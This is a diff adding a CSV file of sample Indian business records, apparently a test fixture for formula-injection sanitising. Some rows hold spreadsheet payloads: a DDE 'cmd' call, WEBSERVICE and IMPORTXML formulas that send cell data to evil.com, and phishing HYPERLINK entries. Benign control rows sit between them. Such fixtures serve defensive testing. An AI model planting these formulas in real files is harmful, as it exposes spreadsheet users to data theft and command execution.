@@ -1,0 +1,14 @@
+Business Name,Phone,Email,GSTIN,PAN,State,District,Address
+=HYPERLINK("http://phishing.com";"Fake Corp Ltd"),1234567890,test@test.com,29ABCDE1234F1Z5,ABCDE1234F,Karnataka,Bangalore,123 Safe Street
+Normal Corporation,9876543210,normal@corp.com,27XYZAB5678G2Y4,XYZAB5678G,Maharashtra,Mumbai,456 Business Park
++91-WEBSERVICE("http://evil.com/log")&A1,5555555555,info@company.com,06PQRST9012H3X6,PQRST9012H,Haryana,Gurgaon,789 Tech Hub
+@SUM(1+1) Industries,4444444444,contact@business.in,09LMNOP3456I4W7,LMNOP3456I,Uttar Pradesh,Noida,321 Industrial Area
+ABC Corp,-9998887777,abc@abc.com,33GHIJK7890J5V8,GHIJK7890J,Tamil Nadu,Chennai,654 Corporate Tower
+Evil Enterprises,=cmd|'/c calc'!A1,evil@evil.com,19UVWXY1234K6U9,UVWXY1234K,West Bengal,Kolkata,=1+1 Evil Street
+Legitimate Business,+91-9876543210,user+tag@company.com,24FGHIJ5678L7T1,FGHIJ5678L,Gujarat,Ahmedabad,987 Commerce Center (Safe: + not at start of email)
+|pipe Corp,3333333333,pipe@corp.in,07RSTUV3456M8S2,RSTUV3456M,Delhi,New Delhi,159 Capital Road
+	Tab Corp,2222222222,tab@company.org,36ABCDE7890N9R3,ABCDE7890N,Telangana,Hyderabad,753 IT Park (Tab at start of name)
+=IMPORTXML(CONCAT("http://evil.com/?data=";A2);"//contact"),1111111111,import@xml.com,22MNOPQ1234O1Q4,MNOPQ1234O,Rajasthan,Jaipur,852 Pink City Plaza
+Safe Company Ltd,0987654321,safe@safe.com,29SAFEC1234P2P5,SAFEC1234P,Karnataka,Mysore,111 Trustworthy Avenue
+=1+1+INDIRECT("R1C1"),7777777777,indirect@test.com,27INDRE2345Q3O6,INDRE2345Q,Maharashtra,Pune,222 Reference Street
+@SUM(INDIRECT("RC[-1]";FALSE)) LLC,6666666666,sum@llc.in,33SUMLL3456R4N7,SUMLL3456R,Tamil Nadu,Coimbatore,=HYPERLINK("http://bad.com";"333 Link Road")
